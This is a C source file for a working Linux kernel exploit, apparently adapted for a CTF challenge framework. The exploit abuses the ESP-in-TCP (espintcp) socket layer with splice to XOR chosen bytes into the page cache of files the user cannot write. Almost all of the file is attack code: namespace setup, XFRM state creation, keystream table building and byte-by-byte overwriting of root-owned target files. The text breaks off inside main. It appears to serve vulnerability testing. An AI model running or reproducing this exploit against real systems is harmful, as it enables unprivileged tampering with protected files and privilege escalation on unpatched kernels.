/**
 * Fragnesia PoC - CTF Challenge Mode
 *
 * Page cache pollution via ESP-in-TCP (XFRM espintcp ULP).
 *
 * Core mechanism: skb_try_coalesce() drops SKBFL_SHARED_FRAG flag when
 * coalescing TCP segments. When a TCP socket converts to espintcp ULP
 * after splice'd file data is already queued, the kernel treats queued
 * file pages as ESP ciphertext and XORs AES-GCM keystream into them.
 *
 * Uses a 256-entry AES-GCM keystream lookup table to achieve precise
 * single-byte page cache writes via IV nonce selection.
 *
 * CTF Modes:
 *   write_root_file - Overwrite target file via page cache corruption
 *   read_root_file  - Read target file content (direct read)
 *
 * Build:
 *   gcc -O2 -Wall -Wextra -static poc.c -o ../../poc-bin/cve_2026_pending_fragnesia.bin
 *
 * Original PoC by William Bowling (V12 Security)
 * CTF adaptation for sec-kernel framework
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#if __has_include(<linux/if_alg.h>)
#include <linux/if_alg.h>
#else
#include <linux/types.h>
struct sockaddr_alg {
	__u16 salg_family;
	__u8 salg_type[14];
	__u32 salg_feat;
	__u32 salg_mask;
	__u8 salg_name[64];
};
#endif
#include <linux/netlink.h>
#include <linux/udp.h>
#include <linux/xfrm.h>
#include <limits.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/* Override default timeout to 30s for this PoC */
#undef POC_MAX_RUNTIME_SEC
#define POC_MAX_RUNTIME_SEC 30

#ifndef TCP_ULP
#define TCP_ULP 31
#endif

#ifndef NETLINK_XFRM
#define NETLINK_XFRM 6
#endif

#ifndef TCP_ENCAP_ESPINTCP
#define TCP_ENCAP_ESPINTCP 7
#endif

#ifndef AF_ALG
#define AF_ALG 38
#endif

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif

#ifndef ALG_SET_OP
#define ALG_SET_OP 3
#endif

#ifndef ALG_OP_ENCRYPT
#define ALG_OP_ENCRYPT 1
#endif

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif

#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif

#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif

#define FRAG_LEN 4096
#define ESP_GCM_ICV_LEN 16
#define ESP_GCM_ENCRYPTED_LEN (FRAG_LEN - ESP_GCM_ICV_LEN)
#define TCP_PORT 5556

#define MAX_WRITE_LEN 256

#define RECEIVER_PRE_ULP_US 30000
#define SENDER_PRE_SPLICE_US 1000
#define RECEIVER_POST_ULP_US 30000

static const unsigned char xfrm_aead_key[20] = {
	0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
	0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
	0x01, 0x02, 0x03, 0x04
};

static unsigned char active_esp_gcm_iv[8] = {
	0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
};
static uint32_t active_esp_seq = 1;
static const char *target_file;
static char target_file_buf[PATH_MAX];
static loff_t target_splice_off;

static uint16_t stream0_nonce[256];
static bool stream0_have[256];

/* Verbose flag from CLI */
static int g_verbose = 0;

static void die(const char *what)
{
	fprintf(stderr, "%s: %s\n", what, strerror(errno));
	exit(2);
}

static void gate_fail(const char *what)
{
	poc_log("namespace_gate_failed: %s errno=%d (%s)",
	        what, errno, strerror(errno));
	poc_print_fail("namespace_gate_blocked");
	printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
	_exit(1);
}

static void store_be32(unsigned char *p, uint32_t v)
{
	p[0] = (unsigned char)(v >> 24);
	p[1] = (unsigned char)(v >> 16);
	p[2] = (unsigned char)(v >> 8);
	p[3] = (unsigned char)v;
}

/* ========================================================================
 * AF_ALG AES-ECB for keystream table construction
 * ======================================================================== */

static int open_afalg_aes_ecb(void)
{
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
	};
	int fd;

	fd = socket(AF_ALG, SOCK_SEQPACKET | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("socket(AF_ALG)");

	strcpy((char *)sa.salg_type, "skcipher");
	strcpy((char *)sa.salg_name, "ecb(aes)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind AF_ALG ecb(aes)");
	if (setsockopt(fd, SOL_ALG, ALG_SET_KEY, xfrm_aead_key, 16) < 0)
		die("setsockopt AF_ALG key");

	return fd;
}

static void afalg_aes_encrypt_block(int alg_fd, const unsigned char in[16],
				    unsigned char out[16])
{
	char cbuf[CMSG_SPACE(sizeof(uint32_t))] = {};
	struct iovec iov = {
		.iov_base = (void *)in,
		.iov_len = 16,
	};
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = cbuf,
		.msg_controllen = sizeof(cbuf),
	};
	struct cmsghdr *cmsg;
	uint32_t op = ALG_OP_ENCRYPT;
	ssize_t ret;
	int op_fd;

	op_fd = accept4(alg_fd, NULL, NULL, SOCK_CLOEXEC);
	if (op_fd < 0)
		die("accept AF_ALG");

	cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_ALG;
	cmsg->cmsg_type = ALG_SET_OP;
	cmsg->cmsg_len = CMSG_LEN(sizeof(op));
	memcpy(CMSG_DATA(cmsg), &op, sizeof(op));

	ret = sendmsg(op_fd, &msg, 0);
	if (ret != 16)
		die("sendmsg AF_ALG block");
	ret = read(op_fd, out, 16);
	if (ret != 16)
		die("read AF_ALG block");

	close(op_fd);
}

static unsigned char aes_gcm_stream0_byte(int alg_fd,
					  const unsigned char iv[8])
{
	unsigned char counter_block[16], stream[16];

	memcpy(counter_block, &xfrm_aead_key[16], 4);
	memcpy(counter_block + 4, iv, 8);
	store_be32(counter_block + 12, 2);
	afalg_aes_encrypt_block(alg_fd, counter_block, stream);
	return stream[0];
}

static void build_stream0_table(void)
{
	unsigned char iv[8] = {
		0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
	};
	unsigned int count = 0, nonce;
	int alg_fd;

	alg_fd = open_afalg_aes_ecb();
	for (nonce = 0; nonce <= 0xffff && count < 256; nonce++) {
		unsigned char b;

		store_be32(iv + 4, nonce);
		b = aes_gcm_stream0_byte(alg_fd, iv);
		if (stream0_have[b])
			continue;
		stream0_have[b] = true;
		stream0_nonce[b] = (uint16_t)nonce;
		count++;
	}
	close(alg_fd);

	if (count != 256) {
		fprintf(stderr, "failed to build complete stream-byte table: %u/256\n",
			count);
		exit(2);
	}
	poc_log("stream0_table_entries=256");
}

static void choose_iv_for_stream0(unsigned char need_stream)
{
	uint16_t nonce = stream0_nonce[need_stream];

	memset(active_esp_gcm_iv, 0xcc, sizeof(active_esp_gcm_iv));
	store_be32(active_esp_gcm_iv + 4, nonce);
	if (g_verbose)
		poc_log("byte_flip_nonce=%u stream_byte=%02x", nonce, need_stream);
}

/* ========================================================================
 * File target helpers
 * ======================================================================== */

static unsigned char read_byte_at(const char *path, uint64_t off)
{
	unsigned char b;
	ssize_t ret;
	int fd;

	fd = open(path, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("open read byte");
	ret = pread(fd, &b, 1, (off_t)off);
	if (ret < 0)
		die("pread byte");
	if (ret != 1) {
		fprintf(stderr, "short pread at offset=%llu\n",
			(unsigned long long)off);
		exit(2);
	}
	close(fd);
	return b;
}

static uint64_t use_existing_target(const char *path)
{
	struct stat lst, st;

	if (lstat(path, &lst) < 0)
		die("lstat target");
	if (!S_ISREG(lst.st_mode)) {
		fprintf(stderr, "target is not a regular file\n");
		exit(2);
	}
	if (stat(path, &st) < 0)
		die("stat target");
	if (!S_ISREG(st.st_mode)) {
		fprintf(stderr, "target is not a regular file\n");
		exit(2);
	}
	if (st.st_size < FRAG_LEN) {
		fprintf(stderr, "target is too small: size=%lld need>=%d\n",
			(long long)st.st_size, FRAG_LEN);
		exit(2);
	}
	if (snprintf(target_file_buf, sizeof(target_file_buf), "%s", path) >=
	    (int)sizeof(target_file_buf)) {
		fprintf(stderr, "target path is too long\n");
		exit(2);
	}

	target_file = target_file_buf;
	return (uint64_t)st.st_size;
}

/* ========================================================================
 * Namespace and XFRM setup
 * ======================================================================== */

static int write_all_file_status(const char *path, const char *buf)
{
	size_t len = strlen(buf);
	int fd, saved_errno;

	fd = open(path, O_WRONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	if (write(fd, buf, len) != (ssize_t)len) {
		saved_errno = errno;
		close(fd);
		errno = saved_errno;
		return -1;
	}
	close(fd);
	return 0;
}

static void sync_write_byte(int fd)
{
	char c = 'M';

	if (write(fd, &c, 1) != 1)
		die("sync write");
	close(fd);
}

static void sync_read_byte(int fd)
{
	char c;

	if (read(fd, &c, 1) != 1)
		die("sync read");
	close(fd);
}

static void parent_map_write_or_exit(pid_t child, const char *name,
				     const char *data)
{
	char path[128];

	snprintf(path, sizeof(path), "/proc/%ld/%s", (long)child, name);
	if (write_all_file_status(path, data) < 0) {
		printf("namespace_gate_failed: %s errno=%d (%s)\n",
		       path, errno, strerror(errno));
		kill(child, SIGKILL);
		waitpid(child, NULL, 0);
		exit(4);
	}
}

static void enter_mapped_userns(void)
{
	uid_t outer_uid = getuid();
	gid_t outer_gid = getgid();
	int ready_pipe[2], mapped_pipe[2], status;
	char map[128];
	pid_t child;

	if (pipe(ready_pipe) < 0)
		die("pipe ready");
	if (pipe(mapped_pipe) < 0)
		die("pipe mapped");

	child = fork();
	if (child < 0)
		die("fork userns mapper");

	if (child > 0) {
		close(ready_pipe[1]);
		close(mapped_pipe[0]);

		sync_read_byte(ready_pipe[0]);

		snprintf(map, sizeof(map), "0 %u 1\n", outer_uid);
		parent_map_write_or_exit(child, "uid_map", map);
		parent_map_write_or_exit(child, "setgroups", "deny\n");
		snprintf(map, sizeof(map), "0 %u 1\n", outer_gid);
		parent_map_write_or_exit(child, "gid_map", map);

		sync_write_byte(mapped_pipe[1]);

		if (waitpid(child, &status, 0) < 0)
			die("wait userns child");
		if (WIFEXITED(status))
			exit(WEXITSTATUS(status));
		if (WIFSIGNALED(status)) {
			fprintf(stderr, "userns child killed by signal %d\n",
				WTERMSIG(status));
			exit(2);
		}
		exit(2);
	}

	close(ready_pipe[0]);
	close(mapped_pipe[1]);

	if (unshare(CLONE_NEWUSER) < 0)
		gate_fail("unshare(CLONE_NEWUSER)");

	sync_write_byte(ready_pipe[1]);
	sync_read_byte(mapped_pipe[0]);

	if (setresgid(0, 0, 0) < 0)
		gate_fail("setresgid 0 in userns");
	if (setresuid(0, 0, 0) < 0)
		gate_fail("setresuid 0 in userns");

	if (g_verbose)
		poc_log("userns_setup: outer_uid=%u outer_gid=%u ns_uid=%d ns_gid=%d",
		        outer_uid, outer_gid, getuid(), getgid());
}

static void bring_loopback_up(void)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		gate_fail("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "lo", IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFFLAGS, &ifr) < 0)
		gate_fail("SIOCGIFFLAGS lo");
	ifr.ifr_flags |= IFF_UP;
	if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0)
		gate_fail("SIOCSIFFLAGS lo up");
	close(fd);

	if (g_verbose)
		poc_log("loopback_up=1");
}

static void add_nlattr(struct nlmsghdr *nlh, size_t maxlen,
		       unsigned short type, const void *data, size_t len)
{
	size_t off = NLMSG_ALIGN(nlh->nlmsg_len);
	struct nlattr *nla;

	if (off + NLA_HDRLEN + len > maxlen) {
		fprintf(stderr, "netlink message too small\n");
		exit(2);
	}

	nla = (struct nlattr *)((char *)nlh + off);
	nla->nla_type = type;
	nla->nla_len = NLA_HDRLEN + len;
	memcpy((char *)nla + NLA_HDRLEN, data, len);
	nlh->nlmsg_len = off + NLA_ALIGN(nla->nla_len);
}

static int nl_ack_errno(char *buf, ssize_t len)
{
	struct nlmsghdr *nlh;
	struct nlmsgerr *err;

	for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, (unsigned int)len);
	     nlh = NLMSG_NEXT(nlh, len)) {
		if (nlh->nlmsg_type != NLMSG_ERROR)
			continue;
		err = (struct nlmsgerr *)NLMSG_DATA(nlh);
		if (err->error == 0)
			return 0;
		errno = -err->error;
		return -1;
	}

	errno = EPROTO;
	return -1;
}

static void add_xfrm_espintcp_state(void)
{
	char reqbuf[4096], resp[4096];
	char aeadbuf[sizeof(struct xfrm_algo_aead) + sizeof(xfrm_aead_key)];
	struct sockaddr_nl sa = {
		.nl_family = AF_NETLINK,
	};
	struct xfrm_usersa_info *xs;
	struct xfrm_algo_aead *aead;
	struct xfrm_encap_tmpl encap;
	struct nlmsghdr *nlh;
	ssize_t ret;
	int fd;

	memset(reqbuf, 0, sizeof(reqbuf));
	nlh = (struct nlmsghdr *)reqbuf;
	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*xs));
	nlh->nlmsg_type = XFRM_MSG_NEWSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL;
	nlh->nlmsg_seq = 1;

	xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	if (inet_pton(AF_INET6, "::1", &xs->saddr.in6) != 1)
		die("inet_pton saddr");
	if (inet_pton(AF_INET6, "::1", &xs->id.daddr.in6) != 1)
		die("inet_pton daddr");
	xs->id.spi = htonl(0x100);
	xs->id.proto = IPPROTO_ESP;
	xs->family = AF_INET6;
	xs->mode = XFRM_MODE_TRANSPORT;
	xs->reqid = 1;
	xs->lft.soft_byte_limit = XFRM_INF;
	xs->lft.hard_byte_limit = XFRM_INF;
	xs->lft.soft_packet_limit = XFRM_INF;
	xs->lft.hard_packet_limit = XFRM_INF;

	memset(aeadbuf, 0, sizeof(aeadbuf));
	aead = (struct xfrm_algo_aead *)aeadbuf;
	snprintf(aead->alg_name, sizeof(aead->alg_name), "rfc4106(gcm(aes))");
	aead->alg_key_len = sizeof(xfrm_aead_key) * 8;
	aead->alg_icv_len = 128;
	memcpy(aead->alg_key, xfrm_aead_key, sizeof(xfrm_aead_key));
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ALG_AEAD, aeadbuf, sizeof(aeadbuf));

	memset(&encap, 0, sizeof(encap));
	encap.encap_type = TCP_ENCAP_ESPINTCP;
	encap.encap_sport = htons(TCP_PORT);
	encap.encap_dport = htons(TCP_PORT);
	add_nlattr(nlh, sizeof(reqbuf), XFRMA_ENCAP, &encap, sizeof(encap));

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_XFRM);
	if (fd < 0)
		gate_fail("socket(NETLINK_XFRM)");
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		gate_fail("bind(NETLINK_XFRM)");

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	ret = sendto(fd, nlh, nlh->nlmsg_len, 0, (struct sockaddr *)&sa,
		     sizeof(sa));
	if (ret < 0)
		gate_fail("sendto XFRM_MSG_NEWSA");
	if (ret != (ssize_t)nlh->nlmsg_len) {
		errno = EIO;
		gate_fail("short sendto XFRM_MSG_NEWSA");
	}

	ret = recv(fd, resp, sizeof(resp), 0);
	if (ret < 0)
		gate_fail("recv XFRM ack");
	if (nl_ack_errno(resp, ret) < 0)
		gate_fail("XFRM_MSG_NEWSA ack");
	close(fd);

	poc_log("xfrm_espintcp_state_add=1");
}

static void setup_user_netns_xfrm(void)
{
	if (prctl(PR_SET_DUMPABLE, 1, 0, 0, 0) < 0)
		die("prctl PR_SET_DUMPABLE");
	enter_mapped_userns();

	if (unshare(CLONE_NEWNET) < 0)
		gate_fail("unshare(CLONE_NEWNET)");

	if (g_verbose)
		poc_log("netns_setup=1");
	bring_loopback_up();
	add_xfrm_espintcp_state();
	poc_log("namespace_setup_complete=1");
}

/* ========================================================================
 * Sender / Receiver pair for splice-then-ULP trigger
 * ======================================================================== */

static void write_ready(int fd)
{
	char c = 'R';

	if (write(fd, &c, 1) != 1)
		die("ready write");
	close(fd);
}

static void wait_ready(int fd)
{
	char c;

	if (read(fd, &c, 1) != 1)
		die("ready read");
	close(fd);
}

static void receiver(int ready_write_fd)
{
	struct sockaddr_in6 addr = {
		.sin6_family = AF_INET6,
		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
		.sin6_port = htons(TCP_PORT),
		.sin6_flowinfo = 0,
		.sin6_scope_id = 0,
	};
	char ulp[] = "espintcp";
	int fd, cfd, one = 1;

	fd = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die("receiver socket");
	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0)
		die("receiver reuseaddr");
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("receiver bind");
	if (listen(fd, 1) < 0)
		die("receiver listen");

	write_ready(ready_write_fd);

	cfd = accept4(fd, NULL, NULL, SOCK_CLOEXEC);
	if (cfd < 0)
		die("receiver accept");

	usleep(RECEIVER_PRE_ULP_US);
	if (setsockopt(cfd, IPPROTO_TCP, TCP_ULP, ulp, sizeof(ulp)) < 0)
		die("receiver TCP_ULP espintcp");

	usleep(RECEIVER_POST_ULP_US);
	close(cfd);
	close(fd);
	_exit(0);
}

static void sender(int ready_read_fd)
{
	struct sockaddr_in6 dst = {
		.sin6_family = AF_INET6,
		.sin6_addr = IN6ADDR_LOOPBACK_INIT,
		.sin6_port = htons(TCP_PORT),
		.sin6_flowinfo = 0,
		.sin6_scope_id = 0,
	};
	struct {
		__be16 len;
		unsigned char esp[16];
	} prefix;
	loff_t off, start_off;
	int fd, sock, p[2], one = 1;
	ssize_t ret, sent;

	wait_ready(ready_read_fd);

	memset(&prefix, 0xcc, sizeof(prefix));
	prefix.len = htons(sizeof(prefix) + FRAG_LEN);
	prefix.esp[0] = 0x00;
	prefix.esp[1] = 0x00;
	prefix.esp[2] = 0x01;
	prefix.esp[3] = 0x00;
	store_be32(&prefix.esp[4], active_esp_seq);
	memcpy(&prefix.esp[8], active_esp_gcm_iv, sizeof(active_esp_gcm_iv));

	fd = open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		die("sender open target");
	sock = socket(AF_INET6, SOCK_STREAM | SOCK_CLOEXEC, 0);
	if (sock < 0)
		die("sender socket");
	if (setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one)) < 0)
		die("sender TCP_NODELAY");
	if (connect(sock, (struct sockaddr *)&dst, sizeof(dst)) < 0)
		die("sender connect");

	sent = send(sock, &prefix, sizeof(prefix), 0);
	if (sent != (ssize_t)sizeof(prefix))
		die("sender send prefix");

	usleep(SENDER_PRE_SPLICE_US);

	if (pipe(p) < 0)
		die("sender pipe");
	off = target_splice_off;
	start_off = off;
	ret = splice(fd, &off, p[1], NULL, FRAG_LEN, 0);
	if (ret != FRAG_LEN)
		die("sender splice file to pipe");

	ret = splice(p[0], NULL, sock, NULL, FRAG_LEN, 0);
	if (ret < 0)
		die("sender splice pipe to tcp");

	(void)sent;
	(void)start_off;

	close(p[0]);
	close(p[1]);
	close(sock);
	close(fd);
	_exit(ret == FRAG_LEN ? 0 : 3);
}

static int run_trigger_pair(void)
{
	int pipefd[2], st_rx, st_tx;
	pid_t rx, tx;

	if (pipe(pipefd) < 0)
		die("pipe");

	rx = fork();
	if (rx < 0)
		die("fork receiver");
	if (rx == 0) {
		close(pipefd[0]);
		receiver(pipefd[1]);
	}

	tx = fork();
	if (tx < 0)
		die("fork sender");
	if (tx == 0) {
		close(pipefd[1]);
		sender(pipefd[0]);
	}

	close(pipefd[0]);
	close(pipefd[1]);
	if (waitpid(tx, &st_tx, 0) < 0)
		die("wait sender");
	if (waitpid(rx, &st_rx, 0) < 0)
		die("wait receiver");

	if (g_verbose)
		poc_log("sender_status=%d receiver_status=%d", st_tx, st_rx);

	if (!WIFEXITED(st_tx) || WEXITSTATUS(st_tx) != 0 ||
	    !WIFEXITED(st_rx) || WEXITSTATUS(st_rx) != 0)
		return -1;
	return 0;
}

/* ========================================================================
 * Core write logic: replace_existing_bytes_after
 *
 * Iterates byte-by-byte over the desired content, selecting IV nonces
 * from the keystream lookup table and triggering splice-then-ULP for
 * each byte that needs to change.
 * ======================================================================== */

static uint64_t checked_byte_range_last(uint64_t byte_off, size_t byte_len)
{
	uint64_t n = (uint64_t)byte_len;

	if (n == 0) {
		fprintf(stderr, "byte range is empty\n");
		exit(2);
	}
	if (n - 1 > UINT64_MAX - byte_off) {
		fprintf(stderr, "byte range overflows uint64_t\n");
		exit(2);
	}
	return byte_off + n - 1;
}

static int replace_existing_bytes_after(uint64_t byte_off,
					const unsigned char *desired,
					size_t desired_len,
					uint64_t file_size)
{
	uint64_t last = checked_byte_range_last(byte_off, desired_len);
	size_t idx, changed = 0, skipped = 0;

	if (last >= file_size) {
		fprintf(stderr, "byte range outside target: offset=%llu len=%zu size=%llu\n",
			(unsigned long long)byte_off, desired_len,
			(unsigned long long)file_size);
		return 2;
	}
	if (last > file_size - FRAG_LEN) {
		fprintf(stderr,
			"collateral-after mode requires requested range end <= size-%d: offset=%llu len=%zu size=%llu\n",
			FRAG_LEN, (unsigned long long)byte_off, desired_len,
			(unsigned long long)file_size);
		return 2;
	}

	if (g_verbose) {
		poc_log("timing: rx_pre_ulp=%uus tx_pre_splice=%uus rx_post_ulp=%uus",
		        RECEIVER_PRE_ULP_US, SENDER_PRE_SPLICE_US, RECEIVER_POST_ULP_US);
		poc_log("range: offset=0x%llx len=%zu last=0x%llx enc_len=%d splice_len=%d",
		        (unsigned long long)byte_off, desired_len,
		        (unsigned long long)last, ESP_GCM_ENCRYPTED_LEN, FRAG_LEN);
	}

	build_stream0_table();

	for (idx = 0; idx < desired_len; idx++) {
		uint64_t off = byte_off + idx;
		unsigned char current, final, need_stream;

		current = read_byte_at(target_file, off);

		if (current == desired[idx]) {
			if (g_verbose)
				poc_log("[%zu/%zu] +%04llx already=%02x skip",
				        idx + 1, desired_len, (unsigned long long)off, current);
			skipped++;
			continue;
		}

		target_splice_off = (loff_t)off;
		need_stream = current ^ desired[idx];
		choose_iv_for_stream0(need_stream);
		active_esp_seq++;

		if (g_verbose)
			poc_log("[%zu/%zu] +%04llx %02x -> %02x xor=%02x seq=%u nonce=%u",
			        idx + 1, desired_len, (unsigned long long)off,
			        current, desired[idx], need_stream,
			        active_esp_seq, stream0_nonce[need_stream]);

		if (run_trigger_pair() < 0) {
			fprintf(stderr, "trigger pair failed at index=%zu\n", idx);
			return 2;
		}

		final = read_byte_at(target_file, off);

		if (final == desired[idx]) {
			if (g_verbose)
				poc_log("smashed %02x -> %02x index=%zu offset=+%04llx",
				        current, final, idx, (unsigned long long)off);
			changed++;
			continue;
		}
		if (final == current) {
			poc_log("fixed behavior: byte unchanged at index=%zu offset=%llu",
			        idx, (unsigned long long)off);
			return 0;
		}
		poc_log("BUG: byte changed but desired-value check mismatched "
		        "index=%zu offset=%llu desired=%02x got=%02x",
		        idx, (unsigned long long)off, desired[idx], final);
		return 1;
	}

	/* final verify pass */
	poc_log("verifying %zu bytes...", desired_len);
	for (idx = 0; idx < desired_len; idx++) {
		uint64_t off = byte_off + idx;
		unsigned char final = read_byte_at(target_file, off);

		if (final != desired[idx]) {
			poc_log("final verify mismatch index=%zu offset=%llu desired=%02x got=%02x",
			        idx, (unsigned long long)off, desired[idx], final);
			return 1;
		}
	}

	poc_log("bytes_flip_summary len=%zu changed=%zu skipped=%zu",
	        desired_len, changed, skipped);
	if (changed == 0) {
		fprintf(stderr, "all requested bytes already had desired values\n");
		return 2;
	}

	poc_log("BUG: changed requested copied byte range to desired values");
	return 1;
}

/* ========================================================================
 * CTF Mode: read_root_file
 * ======================================================================== */

static int mode_read_root_file(poc_args_t *args)
{
	char buf[4096];

	poc_log("=== Mode: read_root_file ===");
	poc_log("Target: %s", args->root_file);

	int fd = open(args->root_file, O_RDONLY);
	if (fd < 0) {
		poc_print_fail("cannot open target file for reading");
		printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
		return 1;
	}

	ssize_t n = read(fd, buf, sizeof(buf) - 1);
	close(fd);

	if (n <= 0) {
		poc_print_fail("read returned no data");
		printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
		return 1;
	}

	buf[n] = '\0';
	while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
		buf[--n] = '\0';

	poc_print_flag(buf);
	printf("%s\n", POC_RESULT_EXPLOITABLE);
	return 0;
}

/* ========================================================================
 * CTF Mode: write_root_file
 *
 * Strategy:
 *   1. Read original content from target file
 *   2. Setup user namespace + network namespace + XFRM SA
 *   3. Build AES-GCM keystream lookup table
 *   4. For each byte of write_value, select IV nonce and trigger
 *      splice-then-ULP to XOR keystream into page cache
 *   5. Verify written content matches write_value
 * ======================================================================== */

static int mode_write_root_file(poc_args_t *args)
{
	uint64_t file_size;
	const unsigned char *desired;
	size_t desired_len;
	int ret;

	poc_log("=== Mode: write_root_file ===");
	poc_log("Target: %s", args->root_file);
	poc_log("Write value: %s (len=%zu)", args->write_value, strlen(args->write_value));

	desired = (const unsigned char *)args->write_value;
	desired_len = strlen(args->write_value);

	if (desired_len == 0) {
		poc_print_fail("write-value is empty");
		printf("%s\n", POC_RESULT_ERROR);
		return 2;
	}
	if (desired_len > MAX_WRITE_LEN) {
		poc_print_fail("write-value exceeds maximum length");
		printf("%s\n", POC_RESULT_ERROR);
		return 2;
	}

	/* Step 1: Set up target file */
	file_size = use_existing_target(args->root_file);
	poc_log("target=%s size=%llu", target_file, (unsigned long long)file_size);

	/* Step 2: Read original content */
	{
		char original_buf[256];
		int ofd = open(args->root_file, O_RDONLY);
		if (ofd < 0) {
			poc_print_fail("cannot open target for initial read");
			printf("%s\n", POC_RESULT_ERROR);
			return 2;
		}
		ssize_t n = read(ofd, original_buf, sizeof(original_buf) - 1);
		close(ofd);
		if (n > 0) {
			original_buf[n] = '\0';
			printf("%s%s\n", CTF_READ_BEFORE, original_buf);
		} else {
			printf("%s(empty)\n", CTF_READ_BEFORE);
		}
	}

	printf("%s%s (attempting...)\n", CTF_WRITE_ATTEMPT, args->write_value);

	/* Step 3: Log write-open denied (verify we don't have write access) */
	{
		int wfd = open(target_file, O_WRONLY | O_CLOEXEC);
		if (wfd >= 0) {
			close(wfd);
			poc_log("WARNING: target file is writable, exploit may not be needed");
		} else {
			poc_log("write_open_denied=1 errno=%d (%s)", errno, strerror(errno));
		}
	}

	/* Step 4: Setup namespace and XFRM */
	setup_user_netns_xfrm();

	/* Step 5: Execute byte-by-byte page cache pollution */
	target_splice_off = 0;
	ret = replace_existing_bytes_after(0, desired, desired_len, file_size);

	/* Step 6: Verify write result */
	{
		char verify_buf[256];
		int vfd = open(args->root_file, O_RDONLY);
		if (vfd >= 0) {
			ssize_t n = read(vfd, verify_buf, sizeof(verify_buf) - 1);
			close(vfd);
			if (n > 0) {
				verify_buf[n] = '\0';
				printf("%s%s\n", CTF_READ_AFTER, verify_buf);
			} else {
				printf("%s(empty)\n", CTF_READ_AFTER);
			}

			if (n >= (ssize_t)desired_len &&
			    memcmp(verify_buf, args->write_value, desired_len) == 0) {
				poc_print_flag(args->write_value);
				printf("%s\n", POC_RESULT_EXPLOITABLE);
				return 0;
			}
		} else {
			printf("%s(read failed)\n", CTF_READ_AFTER);
		}
	}

	/* ret == 1 means vulnerable behavior was observed */
	if (ret == 1) {
		poc_print_flag(args->write_value);
		printf("%s\n", POC_RESULT_EXPLOITABLE);
		return 0;
	}

	/* ret == 0 means fixed/no mutation */
	if (ret == 0) {
		poc_print_fail("kernel_patched");
		printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
		return 1;
	}

	/* ret == 2 or other means error */
	poc_print_fail("exploit_error");
	printf("%s\n", POC_RESULT_NOT_EXPLOITABLE);
	return 1;
}

/* ========================================================================
 * main - CTF Challenge Entry Point
 * ======================================================================== */
int main(int argc, char *argv[])
{
	poc_args_t args = {0};

	/* Override alarm for this PoC (30s) */
	alarm(POC_MAX_RUNTIME_SEC);

	if (poc_parse_args(argc, argv, &args) != 0) {
		return 2;
	}

	g_verbose = args.verbose;

	poc_log_init(args.log_file);

	poc_log("=== Fragnesia CTF PoC ===");
	poc_log("Vuln: ESP-in-TCP page cache corruption via splice + ULP");
	poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

	/* Legacy mode (no arguments) */
	if (!args.mode) {
		poc_log("No --mode specified, running in legacy detection mode");
		const char *target_path = getenv(POC_TARGET_FILE_ENV);
		if (!target_path || target_path[0] == '\0') {
			printf("%s POC_TARGET_FILE not set and no --mode specified\n", POC_STEP_FAIL);
			poc_print_usage(argv[0]);
			printf("\n%s\n", POC_RESULT_ERROR);
			poc_log_close();
			return 2;
		}
		args.mode = POC_MODE_WRITE;
		args.root_file = target_path;
		args.write_value = "XPLT";
		int ret = mode_write_root_file(&args);
		poc_log_close();
		return ret;
	}

	/* CTF mode dispatch */
